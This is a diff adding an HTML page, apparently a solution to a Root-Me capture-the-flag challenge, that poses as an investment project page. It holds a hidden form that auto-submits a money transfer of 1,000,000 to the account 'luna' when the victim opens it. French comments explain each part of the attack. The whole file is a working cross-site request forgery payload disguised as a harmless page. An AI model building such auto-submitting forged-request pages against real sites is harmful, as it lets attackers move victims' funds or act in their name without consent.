@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>My Awesome Investment Project</title>
+</head>
+<body>
+    <h1>Welcome to my investment project</h1>
+    <p>Loading project details...</p>
+
+    <!-- Formulaire CSRF qui envoie un virement -->
+    <form id="csrf"
+          action="https://instance-019a9cec-4334-70e8-8dba-401b8098ea5b.challenges.root-me.pro/transfer"
+          method="post">
+
+        <!-- ICI : TON login sur la banque -->
+        <input type="hidden" name="recipient" value="luna">
+
+        <!-- Montant que Pezos va t'envoyer -->
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+
+    <script>
+        // Dès que Pezos ouvre la page, le formulaire est envoyé automatiquement
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>
